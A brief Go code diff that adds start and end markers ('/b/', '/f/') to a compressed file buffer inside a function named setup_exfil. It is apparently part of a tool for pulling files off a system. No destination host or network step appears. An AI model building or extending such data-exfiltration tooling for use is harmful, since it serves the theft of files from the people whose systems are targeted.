@@ -170,6 +170,8 @@ func setup_exfil(file_path string) []byte {
 	if err != nil {
 		panic(err)
 	}
+	dat = append([]byte("/b/"), dat...)
+	dat = append(dat, []byte("/f/")...)
 
 	err = os.Remove("compressed.gz")
 	if err != nil {
